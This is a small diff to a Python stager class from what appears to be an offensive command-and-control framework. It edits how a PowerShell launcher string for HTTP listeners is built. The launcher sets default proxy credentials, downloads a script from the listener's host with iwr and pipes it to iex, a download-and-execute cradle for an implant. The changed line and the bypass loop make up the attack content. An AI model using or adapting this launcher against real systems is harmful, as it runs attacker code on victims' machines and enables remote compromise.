@@ -90,7 +90,7 @@ class Stager:
         launcher = ""
         if listener.module in ["http"]:
             if language == "powershell":
-                launcher_ps = f"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('{host}/download/powershell/')-UseBasicParsing|iex"
+                launcher_ps = f"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('{listener.host_address}download/powershell/')-UseBasicParsing|iex"
 
                 with SessionLocal.begin() as db:
                     for bypass_name in bypasses.split(" "):
